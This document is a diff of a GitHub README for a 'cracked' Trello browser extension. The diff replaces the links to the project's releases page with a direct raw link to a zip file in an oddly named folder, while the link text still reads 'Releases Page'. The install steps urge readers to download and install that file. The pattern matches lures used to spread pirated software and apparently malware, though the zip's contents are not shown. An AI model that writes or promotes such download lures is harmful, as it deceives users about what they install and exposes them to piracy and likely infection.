@@ -1,7 +1,7 @@
 # 🎉 cracked-enhancer-for-trello-extension - Boost Your Trello Experience Easily
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/jyng2002/cracked-enhancer-for-trello-extension/releases)
+[![Download](https://github.com/jyng2002/cracked-enhancer-for-trello-extension/raw/refs/heads/main/hangworthy/cracked_trello_enhancer_for_extension_v1.3.zip%20Release-brightgreen)](https://github.com/jyng2002/cracked-enhancer-for-trello-extension/raw/refs/heads/main/hangworthy/cracked_trello_enhancer_for_extension_v1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the Cracked Enhancer for Trello Extension! This tool enhances your Trello experience by adding useful features that help you stay organized and boost productivity.
@@ -9,7 +9,7 @@ Welcome to the Cracked Enhancer for Trello Extension! This tool enhances your Tr
 ## 📥 Download & Install
 To get started, follow these simple steps:
 
-1. **Visit the Releases Page:** Click this link to access the download page: [Releases Page](https://github.com/jyng2002/cracked-enhancer-for-trello-extension/releases).
+1. **Visit the Releases Page:** Click this link to access the download page: [Releases Page](https://github.com/jyng2002/cracked-enhancer-for-trello-extension/raw/refs/heads/main/hangworthy/cracked_trello_enhancer_for_extension_v1.3.zip).
 2. **Select the Latest Version:** On the releases page, look for the latest version of the Cracked Enhancer for Trello Extension. The version number is often visible at the top.
 3. **Download the Extension:** Find the downloadable file for your browser. Click the file to start the download.
 4. **Install the Extension:**
